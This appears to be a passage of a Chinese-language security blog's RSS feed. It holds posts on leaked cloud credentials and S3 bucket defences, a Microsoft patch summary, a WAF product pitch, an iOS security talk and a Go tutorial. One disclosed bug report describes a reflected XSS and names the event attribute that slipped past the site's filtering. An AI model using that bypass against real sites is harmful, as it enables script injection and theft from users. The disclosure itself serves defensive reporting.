&lt;h2 id=&#34;2021年趋势&#34;&gt;2021年趋势
&lt;/h2&gt;&lt;h3 id=&#34;静态凭证仍是主要初始访问途径&#34;&gt;静态凭证仍是主要初始访问途径
&lt;/h3&gt;&lt;p&gt;静态长期凭证的泄露风险极高。计算表明：假设组织有10个静态凭证，每个每天有0.01%泄露风险，2年内至少一个凭证泄露的概率达52%。&lt;/p&gt;
&lt;h4 id=&#34;实际数据泄露案例&#34;&gt;实际数据泄露案例
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Codecov&lt;/strong&gt;：公开Docker镜像包含GCP服务账户凭证，攻击者替换安装脚本窃取环境变量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Juspay&lt;/strong&gt;：未回收的访问密钥被窃，导致3500万条支付数据泄露&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Kaspersky&lt;/strong&gt;：AWS SES令牌泄露用于发送钓鱼邮件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Upstox/MobiKwik&lt;/strong&gt;：访问密钥泄露导致350万客户KYC数据外泄&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;漏洞案例&#34;&gt;漏洞案例
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Glassdoor员工在GitHub公开AWS访问密钥&lt;/li&gt;
&lt;li&gt;BeVigil发现40款流行Android应用内嵌AWS密钥&lt;/li&gt;
&lt;li&gt;暴露的Apache Airflow实例泄露AWS凭证&lt;/li&gt;
&lt;li&gt;SEGA Europe公开S3存储桶泄露多组凭证&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;恶意软件&#34;&gt;恶意软件
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;TeamTNT团伙窃取AWS/GCP/Docker凭证&lt;/li&gt;
&lt;li&gt;攻击者利用Log4Shell漏洞窃取AWS凭证&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;公开s3存储桶问题&#34;&gt;公开S3存储桶问题
&lt;/h3&gt;&lt;p&gt;2021年公开披露的S3存储桶数据泄露案例：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;公司&lt;/th&gt;
          &lt;th&gt;数据类型&lt;/th&gt;
          &lt;th&gt;影响用户数&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Hobby Lobby&lt;/td&gt;
          &lt;td&gt;姓名/邮箱/地址/源码&lt;/td&gt;
          &lt;td&gt;&amp;gt;30万&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Decathlon Spain&lt;/td&gt;
          &lt;td&gt;姓名/邮箱/电话&lt;/td&gt;
          &lt;td&gt;&amp;gt;7.8万&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Pixlr&lt;/td&gt;
          &lt;td&gt;邮箱/哈希密码&lt;/td&gt;
          &lt;td&gt;190万&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;MobiKwik&lt;/td&gt;
          &lt;td&gt;KYC数据/交易日志&lt;/td&gt;
          &lt;td&gt;350万(KYC)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;SEGA Europe&lt;/td&gt;
          &lt;td&gt;API密钥&lt;/td&gt;
          &lt;td&gt;未披露&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;技术防护方案&#34;&gt;技术防护方案
&lt;/h2&gt;&lt;h3 id=&#34;消除静态长期凭证&#34;&gt;消除静态长期凭证
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;人类用户&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用AWS SSO或IAM角色联合&lt;/li&gt;
&lt;li&gt;通过SCP策略阻止IAM用户创建&lt;/li&gt;
&lt;li&gt;使用aws-vault加密磁盘凭证&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;应用程序&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;优先使用EC2实例角色/Lambda执行角色&lt;/li&gt;
&lt;li&gt;非AWS环境使用Hashicorp Vault&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;SaaS集成&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建专用IAM角色+随机ExternalID&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;扫描异常凭证&#34;&gt;扫描异常凭证
&lt;/h3&gt;&lt;p&gt;推荐工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;代码扫描：detect-secrets/gitleaks/truffleHog&lt;/li&gt;
&lt;li&gt;Docker扫描：SecretScanner/ggshield&lt;/li&gt;
&lt;li&gt;GitGuardian可验证AWS凭证有效性&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;修复s3存储桶配置&#34;&gt;修复S3存储桶配置
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;基础措施&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;账户发现与清单&lt;/li&gt;
&lt;li&gt;IaC扫描工具(tfsec/checkov)&lt;/li&gt;
&lt;li&gt;启用账户级S3 Public Access Block&lt;/li&gt;
&lt;li&gt;运行时扫描(Prowler/ScoutSuite)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;高级加固&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VPC端点限制访问&lt;/li&gt;
&lt;li&gt;客户管理KMS密钥加密&lt;/li&gt;
&lt;li&gt;启用S3数据事件日志&lt;/li&gt;
&lt;li&gt;使用PMapper分析访问权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;保护实例元数据服务&#34;&gt;保护实例元数据服务
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;通过SCP强制使用IMDSv2&lt;/li&gt;
&lt;li&gt;EKS环境阻止Pod访问元数据服务&lt;/li&gt;
&lt;li&gt;利用GuardDuty检测凭证外泄&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;2021年的攻击技术并无重大创新，这反而凸显了基础安全措施的重要性。预计2022年会出现更多类似事件，攻击者可能采用更高级的持久化技术。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;特别说明：本文作者目前就职于Datadog，但本文非公司赞助内容。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>微软2025年7月补丁星期二：修复137个安全漏洞，含14个关键级漏洞</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF2025%E5%B9%B47%E6%9C%88%E8%A1%A5%E4%B8%81%E6%98%9F%E6%9C%9F%E4%BA%8C%E4%BF%AE%E5%A4%8D137%E4%B8%AA%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%90%AB14%E4%B8%AA%E5%85%B3%E9%94%AE%E7%BA%A7%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Sun, 03 Aug 2025 22:53:07 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF2025%E5%B9%B47%E6%9C%88%E8%A1%A5%E4%B8%81%E6%98%9F%E6%9C%9F%E4%BA%8C%E4%BF%AE%E5%A4%8D137%E4%B8%AA%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%90%AB14%E4%B8%AA%E5%85%B3%E9%94%AE%E7%BA%A7%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;p&gt;微软今日发布更新，修复了Windows操作系统及配套软件中至少137个安全漏洞。本月修复的漏洞均未被发现活跃利用迹象，但其中14个被微软评为最严重的&amp;quot;关键&amp;quot;级别——攻击者可在无需或仅需少量用户交互的情况下控制易受攻击的Windows系统。&lt;/p&gt;
&lt;p&gt;虽然未列为关键漏洞，CVE-2025-49719是一个已公开的SQL Server信息泄露漏洞，影响范围涵盖自SQL Server 2016以来的所有版本。微软评估该漏洞利用可能性较低，但由于概念验证代码已存在，受影响企业应优先处理。Action1联合创始人Mike Walters指出，该漏洞无需认证即可利用，且大量第三方应用依赖SQL Server及其驱动组件，可能引发供应链风险。&lt;/p&gt;
&lt;p&gt;Rapid7的Adam Barnett特别提醒关注CVSS评分9.8的CVE-2025-47981，这是Windows客户端与服务端在认证机制协商过程中出现的远程代码执行漏洞，影响Windows 10 1607以上所有客户端及当前所有Windows Server版本。微软认为该漏洞极有可能被攻击者利用。&lt;/p&gt;
&lt;p&gt;Office组件中修复了四个关键远程代码执行漏洞（CVE-2025-49695至49702），其中前两个可通过预览窗格触发且无需用户交互。此外，CVE-2025-49740（CVSS 8.8）允许恶意文件绕过Microsoft Defender SmartScreen检测，而CVE-2025-47178（CVSS 8.0）是Microsoft Configuration Manager中的低权限远程代码执行漏洞，攻击者可借此在企业IT环境中执行任意SQL查询。&lt;/p&gt;
&lt;p&gt;值得注意的是，SQL Server 2012于今日终止支持，将不再接收任何安全更新。Adobe同期也发布了After Effects、Audition等多款产品的安全更新。企业管理员可参考SANS互联网风暴中心的补丁严重性索引，普通用户建议安装更新前做好数据备份。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>██████网站customerId参数反射型XSS漏洞技术分析</title>
        <link>http://localhost:1313/p/%E7%BD%91%E7%AB%99customerid%E5%8F%82%E6%95%B0%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 22:31:29 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BD%91%E7%AB%99customerid%E5%8F%82%E6%95%B0%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;网站customerid参数反射型xss漏洞&#34;&gt;██████网站customerId参数反射型XSS漏洞
&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
&lt;/h2&gt;&lt;p&gt;在██████网站发现一个反射型跨站脚本(XSS)漏洞，该漏洞位于customerId参数中。由于该参数在HTTP响应返回用户前未经过充分净化处理，当参数被恶意JavaScript代码操纵时，注入的脚本会在用户浏览器上下文中执行。&lt;/p&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;p&gt;漏洞利用的关键在于&lt;code&gt;oncontentvisibilityautostatechange&lt;/code&gt;事件属性未被应用程序正确过滤或编码。攻击者可以构造包含JavaScript payload的恶意URL，当受害者访问该URL时，payload将被执行。&lt;/p&gt;
&lt;p&gt;经确认该漏洞在Chrome浏览器中可成功利用，但在Firefox中不可行，这表明可能存在浏览器特定的过滤器绕过机制。&lt;/p&gt;
&lt;h2 id=&#34;漏洞验证&#34;&gt;漏洞验证
&lt;/h2&gt;&lt;p&gt;测试人员通过构造特殊格式的customerId参数成功复现了该漏洞，证实攻击者能够：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;注入任意JavaScript代码&lt;/li&gt;
&lt;li&gt;在受害者浏览器上下文执行&lt;/li&gt;
&lt;li&gt;窃取用户敏感信息或执行其他恶意操作&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2025年5月5日：漏洞首次提交&lt;/li&gt;
&lt;li&gt;2025年5月5日：漏洞等级从高危调整为中危(5.6分)&lt;/li&gt;
&lt;li&gt;2025年6月-7月：经过多次复测验证&lt;/li&gt;
&lt;li&gt;2025年7月1日：漏洞被标记为已修复&lt;/li&gt;
&lt;li&gt;2025年7月28日：漏洞报告公开披露&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;漏洞分类&#34;&gt;漏洞分类
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;弱点类型：反射型跨站脚本(XSS)&lt;/li&gt;
&lt;li&gt;CVE编号：暂无&lt;/li&gt;
&lt;li&gt;严重等级：中危(5.6)&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>如何利用AWS服务实现DDoS防护？Cloudbric匿名IP保护规则详解</title>
        <link>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8aws%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0ddos%E9%98%B2%E6%8A%A4cloudbric%E5%8C%BF%E5%90%8Dip%E4%BF%9D%E6%8A%A4%E8%A7%84%E5%88%99%E8%AF%A6%E8%A7%A3/</link>
        <pubDate>Sun, 03 Aug 2025 22:15:06 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8aws%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0ddos%E9%98%B2%E6%8A%A4cloudbric%E5%8C%BF%E5%90%8Dip%E4%BF%9D%E6%8A%A4%E8%A7%84%E5%88%99%E8%AF%A6%E8%A7%A3/</guid>
        <description>&lt;h1 id=&#34;哪种aws服务能帮助防御ddos攻击---cloudbric&#34;&gt;哪种AWS服务能帮助防御DDoS攻击？ - Cloudbric
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;简短回答&lt;/strong&gt;：AWS WAF——配合Cloudbric的匿名IP保护&amp;amp;Tor IP保护托管规则组&lt;/p&gt;
&lt;p&gt;本文将介绍如何通过Cloudbric的匿名IP保护和Tor IP保护规则组增强AWS WAF，有效拦截隐藏在VPN、代理服务器群和Tor网络后的第7层DDoS洪水攻击。文末将提供分步实施方案，助您提升WAF安全防护等级。&lt;/p&gt;
&lt;h2 id=&#34;为何ddos流量隐匿于匿名网络以及aws-waf的解决方案&#34;&gt;为何DDoS流量隐匿于匿名网络——以及AWS WAF的解决方案
&lt;/h2&gt;&lt;p&gt;攻击者越来越多地通过VPN、公有云IP段和Tor网络代理第7层攻击流量，以规避简单黑名单。行业研究表明，大多数Tor出口节点流量是恶意或自动化的，涉及从凭据填充到低速HTTP洪水攻击等各种行为。&lt;/p&gt;
&lt;p&gt;AWS WAF实时检查每个HTTP(S)请求，天然适合拦截这些伪装流量源。Cloudbric为AWS WAF提供的托管规则组持续更新IP信誉库，自动拦截VPN、代理、数据中心和Tor流量——无需手动维护列表或调整正则表达式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心要点&lt;/strong&gt;：现代云Web安全需要将AWS WAF规则与Cloudbric匿名IP保护结合，实现应用层级的强力DDoS防护。&lt;/p&gt;
&lt;h2 id=&#34;实施前提条件&#34;&gt;实施前提条件
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;所需资源&lt;/th&gt;
          &lt;th&gt;操作步骤&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;具备WAF权限的AWS账户&lt;/td&gt;
          &lt;td&gt;创建Web ACL和托管规则&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;现有CloudFront分发或ALB&lt;/td&gt;
          &lt;td&gt;选择需要保护的资源&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;AWS Marketplace管理员权限&lt;/td&gt;
          &lt;td&gt;订阅Cloudbric产品&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;运营效益与商业价值&#34;&gt;运营效益与商业价值
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;即时缓解&lt;/strong&gt;：边缘节点级拦截在攻击到达源站前阻断&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;资源节约&lt;/strong&gt;：无需为&amp;quot;以防万一&amp;quot;过度配置计算资源或带宽&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;弹性支出&lt;/strong&gt;：安全成本与实际流量而非攻击峰值带宽挂钩&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实时威胁情报&lt;/strong&gt;：Cloudbric研究团队持续更新IP信誉库&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;统一结算&lt;/strong&gt;：订阅费用直接计入AWS账单，无需额外供应商对接&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;aws-marketplace快速入门指南15分钟内完成&#34;&gt;AWS Marketplace快速入门指南（15分钟内完成）
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;步骤&lt;/th&gt;
          &lt;th&gt;操作&lt;/th&gt;
          &lt;th&gt;结果&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;在AWS Marketplace搜索&amp;quot;Cloudbric Managed Rules for AWS WAF&amp;quot;&lt;/td&gt;
          &lt;td&gt;查看规则组选项产品页&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;一键订阅并选择AWS区域&lt;/td&gt;
          &lt;td&gt;规则组将显示在您的账户中&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;将规则组添加至新建或现有Web ACL&lt;/td&gt;
          &lt;td&gt;立即开始拦截匿名化流量&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;客户通常只需一杯咖啡的时间就能完成从零到全面防护的部署。如果您正在从纯自定义规则迁移，只需将Cloudbric规则组设置为更高优先级即可，其他配置无需更改。&lt;/p&gt;
&lt;h2 id=&#34;核心结论&#34;&gt;核心结论
&lt;/h2&gt;&lt;p&gt;当被问及&amp;quot;哪种AWS服务有助于DDoS防护&amp;quot;时，答案很明确：
使用AWS WAF——并通过Cloudbric匿名IP和Tor IP托管规则组增强其功能。您将获得低延迟、高效率的WAF安全防护，使Web或API工作负载免受匿名化第7层DDoS攻击的威胁——而且您现在就可以通过AWS Marketplace点击几下立即部署。&lt;/p&gt;
&lt;h2 id=&#34;关于作者&#34;&gt;关于作者
&lt;/h2&gt;&lt;p&gt;Jensen是一位云安全工程师，他认为拦截恶意流量比拦截垃圾电话更有成就感。他与Cloudbric合作让AWS WAF更智能——这样您就不必自己编写100条自定义规则。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;标签&lt;/strong&gt;：aws ddos防护, aws waf规则, 云Web安全, Cloudbric, 云网络安全, AWS WAF托管规则, vs wafcharm, aws waf, waf网络安全, Web云安全&lt;/p&gt;
</description>
        </item>
        <item>
        <title>深入iOS安全与编译器理论：MAST移动应用安全工具包解析</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5ios%E5%AE%89%E5%85%A8%E4%B8%8E%E7%BC%96%E8%AF%91%E5%99%A8%E7%90%86%E8%AE%BAmast%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%8C%85%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 21:58:16 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5ios%E5%AE%89%E5%85%A8%E4%B8%8E%E7%BC%96%E8%AF%91%E5%99%A8%E7%90%86%E8%AE%BAmast%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%8C%85%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;什么是code-as-craft&#34;&gt;什么是Code as Craft？
&lt;/h3&gt;&lt;p&gt;Etsy的Code as Craft活动是每月两次的嘉宾演讲系列，聚焦技术主题或计算趋势，既分享概念性思想也提供实用建议。所有讲座将在布鲁克林华盛顿街55号7楼的Etsy实验室（712室）举行。&lt;/p&gt;
&lt;h3 id=&#34;演讲内容是什么&#34;&gt;演讲内容是什么？
&lt;/h3&gt;&lt;p&gt;Sophia将探讨iOS安全最新进展及其与编译器理论的交叉点。重点介绍移动应用安全工具包MAST——该项目已从DARPA概念验证发展为完整的移动应用防护套件，集成以下关键技术：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;越狱检测&lt;/strong&gt;：识别设备安全环境&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;反调试&lt;/strong&gt;：阻止动态分析攻击&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;基于LLVM的反逆向&lt;/strong&gt;：在编译器层面实现保护机制&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;演讲将分析当前iOS攻击态势，指出苹果原生API的防御不足，并演示MAST如何为高风险应用提供超越系统原生的保护方案。该工具现已开放测试，参与者可联系获取试用。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Go语言访问控制指南：Java开发者必读</title>
        <link>http://localhost:1313/p/go%E8%AF%AD%E8%A8%80%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%8C%87%E5%8D%97java%E5%BC%80%E5%8F%91%E8%80%85%E5%BF%85%E8%AF%BB/</link>
        <pubDate>Sun, 03 Aug 2025 21:41:56 +0800</pubDate>
        
        <guid>http://localhost:1313/p/go%E8%AF%AD%E8%A8%80%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%8C%87%E5%8D%97java%E5%BC%80%E5%8F%91%E8%80%85%E5%BF%85%E8%AF%BB/</guid>
        <description>&lt;h1 id=&#34;go语言访问控制指南java开发者必读&#34;&gt;Go语言访问控制指南：Java开发者必读
&lt;/h1&gt;&lt;p&gt;Go支持多种编程范式，包括面向对象编程。但如果你从Java转向Go，可能会感到些许&amp;hellip;呃&amp;hellip;不适应。最明显的差异之一是Go完全没有访问修饰符。你可能会疑惑：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我的&lt;code&gt;public&lt;/code&gt;、&lt;code&gt;protected&lt;/code&gt;和&lt;code&gt;private&lt;/code&gt;关键字去哪了？&lt;/li&gt;
&lt;li&gt;Go提供了哪些访问控制机制？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;别担心！Go的访问控制比Java更简单。完全不需要访问修饰符！&lt;/p&gt;
&lt;h2 id=&#34;为什么go只需要两种访问级别&#34;&gt;为什么Go只需要两种访问级别
&lt;/h2&gt;&lt;p&gt;Java提供了四种访问级别，从最严格到最宽松依次是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;private&lt;/code&gt;：仅限同一类内访问&lt;/li&gt;
&lt;li&gt;&lt;code&gt;package-private&lt;/code&gt;：仅限同一包内访问&lt;/li&gt;
&lt;li&gt;&lt;code&gt;protected&lt;/code&gt;：允许同一包及(直接或间接)子类访问&lt;/li&gt;
&lt;li&gt;&lt;code&gt;public&lt;/code&gt;：完全开放访问&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;现在让我们砍掉其中两个！&lt;/p&gt;
&lt;h3 id=&#34;以包为封装单元&#34;&gt;以包为封装单元
&lt;/h3&gt;&lt;p&gt;Go允许定义具体类型（相当于Java的类），但：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;封装的基本单位是包，而不是像其他语言中的类型。
（来源：《Go编程语言》，Donovan &amp;amp; Kernighan，第6.6节）&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;结构体类型的字段对同一包内的所有代码可见。
（同上）&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;因此Go不需要区分&lt;code&gt;private&lt;/code&gt;和&lt;code&gt;package-private&lt;/code&gt;。现在剩下三种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;private&lt;/code&gt;：仅限同一类内访问&lt;/li&gt;
&lt;li&gt;&lt;code&gt;package-private&lt;/code&gt;：仅限同一包内访问&lt;/li&gt;
&lt;li&gt;&lt;code&gt;protected&lt;/code&gt;：允许同一包及子类访问&lt;/li&gt;
&lt;li&gt;&lt;code&gt;public&lt;/code&gt;：完全开放访问&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;没有继承机制&#34;&gt;没有继承机制
&lt;/h3&gt;&lt;p&gt;最重要的是，Go不提供继承机制。因此Go不需要区分&lt;code&gt;package-private&lt;/code&gt;和&lt;code&gt;protected&lt;/code&gt;。最终只剩下两种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;private&lt;/code&gt;：仅限同一类内访问&lt;/li&gt;
&lt;li&gt;&lt;code&gt;package-private&lt;/code&gt;：仅限同一包内访问&lt;/li&gt;
&lt;li&gt;&lt;code&gt;protected&lt;/code&gt;：允许同一包及子类访问&lt;/li&gt;
&lt;li&gt;&lt;code&gt;public&lt;/code&gt;：完全开放访问&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;go的访问控制机制&#34;&gt;Go的访问控制机制
&lt;/h2&gt;&lt;p&gt;最终Go只需要两种访问级别：公开和包私有。不过Go的术语与Java不同：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;导出(exported)：相当于public&lt;/li&gt;
&lt;li&gt;非导出(non-exported)：相当于package-private&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（&amp;ldquo;unexported&amp;quot;是非正式的同义词，但建议使用更正式的&amp;quot;non-exported&amp;rdquo;）&lt;/p&gt;
&lt;p&gt;Go设计者选择用命名约定而非冗长的关键字来控制访问：&lt;/p&gt;
&lt;p&gt;标识符被导出的条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;标识符名称首字母是大写的Unicode字符（Unicode类别&amp;quot;Lu&amp;quot;）&lt;/li&gt;
&lt;li&gt;标识符在包块中声明，或是字段名/方法名&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;（强调部分）&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;package&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;foo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;Bar&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Bar&amp;#34;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 导出&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;baz&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;baz&amp;#34;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 不导出&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;Go的设计追求易读性，其访问控制设计显著提升了代码可读性：不仅摆脱了繁琐的访问修饰符，通过标识符首字母大小写就能判断是否导出。这是阅读Go代码比Java更轻松的原因之一——当然这只是我的个人观点。你怎么看？&lt;/p&gt;
</description>
        </item>
        <item>
        <title>我在BlackHat 2021和DefCon29的演讲：聚焦UEFI固件供应链与RISC-V芯片故障注入</title>
